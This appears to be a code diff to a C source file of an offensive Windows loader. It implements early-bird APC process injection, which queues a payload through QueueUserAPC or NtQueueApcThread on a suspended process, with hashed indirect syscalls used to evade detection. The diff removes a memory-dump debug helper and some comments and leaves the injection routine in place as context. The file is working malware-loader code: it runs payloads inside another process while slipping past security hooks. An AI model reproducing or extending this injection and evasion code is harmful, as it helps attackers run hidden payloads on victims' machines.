@@ -3,29 +3,6 @@
 #include "injection.h"
 #include <stdio.h>
 
-void PrintMemoryBytes(HANDLE hProcess, PVOID pAddress, SIZE_T byteCount) {
-    BYTE buffer[20]; // Buffer to hold the first 20 bytes
-    SIZE_T bytesRead = 0;
-
-    if (byteCount > sizeof(buffer)) {
-        printf("[!] Requested byte count exceeds buffer size.\n");
-        return;
-    }
-
-    if (ReadProcessMemory(hProcess, pAddress, buffer, byteCount, &bytesRead)) {
-        printf("\n\n<===    MEMORY OUTPUT    ===>\n\n");
-        printf("[i] Memory at 0x%p (First %llu bytes):\n", pAddress, byteCount);
-        for (SIZE_T i = 0; i < bytesRead; i++) {
-            printf("%02X ", buffer[i]);
-        }
-        printf("\n\n<===========================>\n\n");
-    }
-    else {
-        printf("[!] Failed to read process memory at 0x%p. Error: %lu\n", pAddress, GetLastError());
-    }
-}
-
-
 /*
 Parameters:
 	- lpProcessName; a process name under '\System32\' to create
@@ -122,7 +99,6 @@ BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName
 
 //	running QueueUserAPC
 #ifdef HW_INDIRECT_SYSCALL
-    // executing the payload via NtQueueApcThread
     NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)PrepareSyscallHash(NtQueueApcThread_JOAA);
     if ((STATUS = pNtQueueApcThread(hThread, pAddress, NULL, NULL, 0)) != 0) {
         DebugPrint("[!] NtQueueApcThread Failed With Error : 0x%0.8X \n", STATUS);
@@ -133,10 +109,6 @@ BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName
     QueueUserAPC((PAPCFUNC)pAddress, hThread, (ULONG_PTR)NULL);
 #endif
 
-//	since 'CreateSuspendedProcess2' create a process in debug mode,
-//	we need to 'Detach' to resume execution; we do using `DebugActiveProcessStop`   
-	//DebugPrint("[i] Detaching The Target Process ... ");
-	//DebugActiveProcessStop(dwProcessId);
     DebugPrint("[i] Resuming The Suspended Thread ... ");
     NtResumeThread_t pNtResumeThread = (NtResumeThread_t)PrepareSyscall((char*)("NtResumeThread"));
     ULONG suspendCount = 0;
